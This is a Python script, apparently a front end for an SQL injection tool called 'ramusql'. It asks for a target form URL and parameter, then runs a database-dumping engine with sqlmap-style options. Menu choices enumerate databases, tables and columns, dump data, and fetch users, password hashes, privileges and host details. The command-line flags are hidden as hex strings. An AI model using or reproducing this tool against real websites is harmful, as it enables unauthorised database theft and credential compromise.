import os
import subprocess
from sys import platform
BANNER = """
                                         .__
____________    _____  __ __  ___________|  |  
\_  __ \__  \  /     \|  |  \/  ___/ ____/  |  
 |  | \// __ \|  Y Y  \  |  /\___ < <_|  |  |__
 |__|  (____  /__|_|  /____//____  >__   |____/
            \/      \/           \/   |__|  
[1.0#dev]
[python3 is required before running this program]
"""
# Main function, where url, data, and value required
def main():
    clear_scr()
    url = input("Input form url : ")
    data = input("Input 'name' value(ex. username, password) : ")
    val = input("Input value(ex. 1, admin, etc.) : ")
    get_first(url, data, val)

# Clear screen cmd/terminal
def clear_scr():
    if platform == "linux" or platform == "linux2":
        os.system('clear')
        print(BANNER)
    elif platform == "win32":
        os.system('cls')
        print(BANNER)

# Choose attack option
def get_first(url, data, val):
    print("1. Discover database name and information")
    print("2. Discover table name(database name required)")
    print("3. Discover column name(db name and table name required)")
    print("4. Dump all data from specific table")
    print("5. Dump data from specific column")
    print("6. Get system information")
    print("7. Back to previous menu")
    print("8. Close program")
    option = int(input("Choose option : "))
    print('\n')
    check_os(url, data, val, option)

# Command attack option will run depending on what platform it is
def check_os(url, data, val, option):
    cmduse = [
        bytearray.fromhex('6d61696e2f72616d7573716c2e7079').decode(),bytearray.fromhex('2d75').decode(),bytearray.fromhex('2d2d64617461').decode(),bytearray.fromhex('2d2d646273').decode(),bytearray.fromhex('2d44').decode(),bytearray.fromhex('2d2d7461626c6573').decode(),bytearray.fromhex('2d54').decode(),bytearray.fromhex('2d2d636f6c756d6e73').decode(),bytearray.fromhex('2d2d64756d70').decode(),bytearray.fromhex('2d43').decode(),bytearray.fromhex('2d2d63757272656e742d75736572').decode(),bytearray.fromhex('2d2d63757272656e742d6462').decode(),bytearray.fromhex('2d2d686f73746e616d65').decode(),bytearray.fromhex('2d2d7573657273').decode(),bytearray.fromhex('2d2d70617373776f726473').decode(),bytearray.fromhex('2d2d70726976696c65676573').decode(),bytearray.fromhex('2d2d726f6c6573').decode(),
        ]
    if platform == "linux" or platform == "linux2":
        cmduse[0] = bytearray.fromhex('2f7573722f73686172652f72616d7573716c2f6d61696e2f72616d7573716c2e7079').decode()
    elif platform == "win32":
        cmduse[0] = bytearray.fromhex('6d61696e2f72616d7573716c2e7079').decode()
    joined = [cmduse[0],cmduse[1],str(url),cmduse[2],'"'+str(data)+'='+str(val)+'"']
    # check platform for different command use
    choosed_platform = ''
    if platform == "linux" or platform == "linux2":
        choosed_platform = 'python3'
    elif platform == "win32":
        choosed_platform = 'py'
    # Option
    if option == 1:
        subprocess.call([str(choosed_platform)]+joined+[cmduse[3],cmduse[13],cmduse[15]])
    elif option == 2:
        db = input('Input database name : ')
        subprocess.call([str(choosed_platform)]+joined+[cmduse[4],str(db),cmduse[5]])
    elif option == 3:
        db = input('Input database name : ')
        table = input('Input table name : ')
        subprocess.call([str(choosed_platform)]+joined+[cmduse[4],str(db),cmduse[6],str(table),cmduse[7]])
    elif option == 4:
        db = input('Input database name : ')
        table = input('Input table name : ')
        subprocess.call([str(choosed_platform)]+joined+[cmduse[4],str(db),cmduse[6],str(table),cmduse[8]])
    elif option == 5:
        db = input('Input database name : ')
        table = input('Input table name : ')
        column = input('Input column name : ')
        subprocess.call([str(choosed_platform)]+joined+[cmduse[4],str(db),cmduse[6],str(table),cmduse[9],str(column),cmduse[8]])
    elif option == 6:
        subprocess.call([str(choosed_platform)]+joined+[cmduse[10],cmduse[11],cmduse[12]])
    elif option == 7:
        main()
    elif option == 8:
        exit()
    else:
        print("Option not found!")
        
main()
